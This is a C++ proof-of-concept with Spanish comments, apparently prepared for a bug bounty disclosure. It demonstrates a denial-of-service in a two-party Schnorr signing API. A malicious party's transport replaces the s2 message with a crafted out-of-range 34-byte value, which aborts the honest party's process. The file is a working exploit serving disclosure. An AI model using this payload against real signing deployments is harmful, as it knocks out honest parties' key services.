// ============================================================================
// poc_schnorr_sign_dos.cpp — PoC MÍNIMO y DETERMINISTA (sin fuzzer, sin RNG hook)
// ----------------------------------------------------------------------------
// Demuestra un Denial-of-Service en coinbase::api::schnorr_2p::sign (BIP340).
// MISMA CLASE que el DoS de ecdsa_2p::refresh (reporte #3871815), pero en OTRO
// protocolo (Schnorr) y OTRA función (sign): escalar de peer sin validar rango.
//
// Modelo de amenaza (BUG_BOUNTY.md): P1 es HONESTO y corre la librería SIN
// MODIFICAR vía la API pública. P2 es malicioso y solo interactúa por el límite
// del protocolo: su transporte reemplaza el mensaje `s2` que le manda a P1.
// NO se toca include-internal/ como entry point.
//
// El bug: en src/cbmpc/protocol/schnorr_2p.cpp:118, P1 (dentro de sign_batch)
// calcula
//     MODULO(q) { s = s1 + s2[i]; }
// usando `s2[i]` recibido de P2 (línea 110, `job.p2_to_p1(s2)`) SIN validar que
// s2[i] esté en [0, q). Entre recibirlo (110) y usarlo (118) solo hay un chequeo
// de TAMAÑO del batch (línea 113), NO de rango. Un s2[0] fuera de rango dispara el
// assert `is_in_range` en mod_t::check() (base_mod.cpp:79) y aborta el proceso de
// la parte HONESTA (SIGABRT), en vez de devolver un error_t limpio.
//
// El mensaje `s2` es la serialización de un std::vector<bn_t> de 1 elemento:
//     [convert_len(count=1) = 0x01] [bn_header = (32<<1)|0 = 0x40] [32 bytes]
// Lo reemplazamos por 32 bytes de 0xFF => valor = 2^256-1 > q (fuera de rango),
// que decodifica LIMPIO (pasa el chequeo de tamaño MAX_SERIALIZED_BIGNUM_BYTES)
// pero revienta el is_in_range al sumarlo.  Total: 34 bytes exactos, sin bytes de
// más -> el deser no se desalinea (ese fue el error del PoC de refresh anterior).
//
// Compilar: ver build_poc_schnorr.sh
// Correr:   ./poc_schnorr_sign_dos  -> aborta con "Assertion failed: is_in_range(a)"
// ============================================================================

#include <cbmpc/api/curve.h>
#include <cbmpc/api/schnorr_2p.h>
#include <cbmpc/core/buf.h>
#include <cbmpc/core/error.h>
#include <cbmpc/core/job.h>

#include <atomic>
#include <condition_variable>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <deque>
#include <mutex>
#include <string_view>
#include <thread>
#include <vector>

using namespace coinbase;
namespace e2 = coinbase::api::schnorr_2p;

// ---------------------------------------------------------------------------
// Canal 2P en memoria (transporte de juguete; ambas partes en el mismo proceso
// solo para el PoC — en producción serían dos máquinas).
// ---------------------------------------------------------------------------
struct channel_t {
  std::mutex m;
  std::condition_variable cv;
  std::deque<buf_t> q[2][2];  // q[emisor][receptor]
  bool aborted = false;
  void abort_all() { { std::lock_guard<std::mutex> lk(m); aborted = true; } cv.notify_all(); }
};

// P1: transporte HONESTO, no modifica nada.
struct honest_transport_t : public coinbase::api::data_transport_i {
  channel_t& ch; int me;
  honest_transport_t(channel_t& c, int me_) : ch(c), me(me_) {}
  error_t send(coinbase::api::party_idx_t rcv, mem_t msg) override {
    { std::lock_guard<std::mutex> lk(ch.m); ch.q[me][(int)rcv].emplace_back(msg.data, msg.size); }
    ch.cv.notify_all(); return SUCCESS;
  }
  error_t receive(coinbase::api::party_idx_t snd, buf_t& msg) override {
    std::unique_lock<std::mutex> lk(ch.m);
    ch.cv.wait(lk, [&] { return ch.aborted || !ch.q[(int)snd][me].empty(); });
    if (ch.q[(int)snd][me].empty()) return coinbase::error(E_NET_GENERAL);
    msg = ch.q[(int)snd][me].front(); ch.q[(int)snd][me].pop_front();
    return SUCCESS;
  }
  error_t receive_all(const std::vector<coinbase::api::party_idx_t>& s, std::vector<buf_t>& m) override {
    m.resize(s.size());
    for (size_t i = 0; i < s.size(); ++i) if (error_t rv = receive(s[i], m[i])) return rv;
    return SUCCESS;
  }
};

// P2: transporte MALICIOSO. Reemplaza el 2do mensaje que le manda a P1 durante
// sign (el de `s2`) por un vector<bn_t>{2^256-1} fuera de rango.
//   Flujo sign P2->P1:  send #1 = (R2, zk_dl2, sid2)  [línea 51]
//                       send #2 = (s2)                [línea 110]  <-- este
struct malicious_transport_t : public coinbase::api::data_transport_i {
  channel_t& ch; int me;
  int sends_to_p1 = 0;
  malicious_transport_t(channel_t& c, int me_) : ch(c), me(me_) {}

  // vector<bn_t> de 1 elemento = 2^256-1 (fuera de rango [0,q)).
  static buf_t make_out_of_range_s2() {
    buf_t out(2 + 32);
    uint8_t* p = out.data();
    p[0] = 0x01;                          // convert_len(count = 1)
    p[1] = 0x40;                          // bn header = (32 << 1) | 0  (32 bytes, positivo)
    for (int i = 0; i < 32; ++i) p[2 + i] = 0xFF;  // valor = 2^256 - 1  > q
    return out;
  }

  error_t send(coinbase::api::party_idx_t rcv, mem_t msg) override {
    buf_t out(msg.data, msg.size);
    if ((int)rcv == 0 && ++sends_to_p1 == 2) {  // 2do envío P2->P1 = mensaje s2
      out = make_out_of_range_s2();
      std::fprintf(stderr, "[P2 malicioso] s2 reemplazado por 2^256-1 (fuera de rango) en el mensaje de sign\n");
    }
    { std::lock_guard<std::mutex> lk(ch.m); ch.q[me][(int)rcv].push_back(out); }
    ch.cv.notify_all(); return SUCCESS;
  }
  error_t receive(coinbase::api::party_idx_t snd, buf_t& msg) override {
    std::unique_lock<std::mutex> lk(ch.m);
    ch.cv.wait(lk, [&] { return ch.aborted || !ch.q[(int)snd][me].empty(); });
    if (ch.q[(int)snd][me].empty()) return coinbase::error(E_NET_GENERAL);
    msg = ch.q[(int)snd][me].front(); ch.q[(int)snd][me].pop_front();
    return SUCCESS;
  }
  error_t receive_all(const std::vector<coinbase::api::party_idx_t>& s, std::vector<buf_t>& m) override {
    m.resize(s.size());
    for (size_t i = 0; i < s.size(); ++i) if (error_t rv = receive(s[i], m[i])) return rv;
    return SUCCESS;
  }
};

int main() {
  const auto curve = coinbase::api::curve_id::secp256k1;
  std::string_view n1 = "P1", n2 = "P2";

  // ---- 1) DKG limpio: genera un par de claves válido (RNG REAL, sin tocar) ----
  channel_t ch;
  honest_transport_t d1(ch, 0), d2(ch, 1);
  coinbase::api::job_2p_t dj1{coinbase::api::party_2p_t::p1, n1, n2, d1};
  coinbase::api::job_2p_t dj2{coinbase::api::party_2p_t::p2, n1, n2, d2};

  buf_t k1, k2;
  error_t r1 = E_GENERAL, r2 = E_GENERAL;
  std::thread t1([&] { r1 = e2::dkg(dj1, curve, k1); if (r1) ch.abort_all(); });
  std::thread t2([&] { r2 = e2::dkg(dj2, curve, k2); if (r2) ch.abort_all(); });
  t1.join(); t2.join();
  if (r1 != SUCCESS || r2 != SUCCESS) { std::fprintf(stderr, "DKG falló, no se pudo montar el PoC\n"); return 2; }
  std::fprintf(stderr, "[setup] DKG OK — claves Schnorr válidas generadas.\n");

  // ---- 2) SIGN con P2 malicioso: reemplaza s2 en tránsito hacia P1 ----
  // P1 corre la librería SIN modificar. El único componente malicioso es el
  // transporte de P2, que actúa solo en el límite del protocolo.
  channel_t ch2;
  honest_transport_t h1(ch2, 0);       // P1 HONESTO
  malicious_transport_t m2(ch2, 1);    // P2 MALICIOSO (MITM sobre su propio canal)
  coinbase::api::job_2p_t sj1{coinbase::api::party_2p_t::p1, n1, n2, h1};
  coinbase::api::job_2p_t sj2{coinbase::api::party_2p_t::p2, n1, n2, m2};

  // mensaje BIP340: exactamente 32 bytes.
  buf_t msg(32); for (int i = 0; i < 32; ++i) msg.data()[i] = (uint8_t)(0x11 * (i + 1));
  buf_t sig1, sig2;
  error_t ss1 = E_GENERAL, ss2 = E_GENERAL;
  std::fprintf(stderr, "[run] Ejecutando sign con P2 malicioso...\n");
  std::thread ts1([&] { ss1 = e2::sign(sj1, k1, mem_t(msg.data(), msg.size()), sig1); if (ss1) ch2.abort_all(); });
  std::thread ts2([&] { ss2 = e2::sign(sj2, k2, mem_t(msg.data(), msg.size()), sig2); if (ss2) ch2.abort_all(); });
  ts1.join(); ts2.join();

  // Si llegamos acá SIN abortar, el bug no reprodujo (quizá ya está parcheado).
  std::fprintf(stderr, "[result] sign terminó SIN crash. rv_P1=%x rv_P2=%x\n", (unsigned)ss1, (unsigned)ss2);
  std::fprintf(stderr, "Si esperabas el crash y no ocurrió, revisá el índice del envío o el layout del mensaje.\n");
  return 0;
}